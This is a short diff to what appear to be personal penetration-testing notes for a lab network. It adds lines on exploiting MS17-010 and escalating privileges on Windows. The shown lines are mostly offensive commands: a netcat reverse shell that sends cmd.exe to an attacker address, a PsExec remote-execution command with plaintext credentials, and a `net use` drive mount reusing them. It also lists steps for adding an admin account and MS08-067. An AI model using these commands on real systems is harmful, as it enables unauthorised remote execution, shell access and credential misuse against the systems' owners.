@@ -35,10 +35,13 @@ Things to try:
     * Put nc.exe => reverse shell
     * Get password files => access via. ssh/ rdp
 * MS17-010 Code Exec
-    * `PsExec.exe`
+    * `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
     * `runas`
     * `nc.exe 10.11.0.42 443 -e cmd.exe`
     * Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit
+* Privesc
+    * Mount drives: `net use z: \\10.11.1.49\Users /user:alice aliceishere`
+    
 
 Exploits:
 * [MS08-067] NetAPI module in Windows SMB
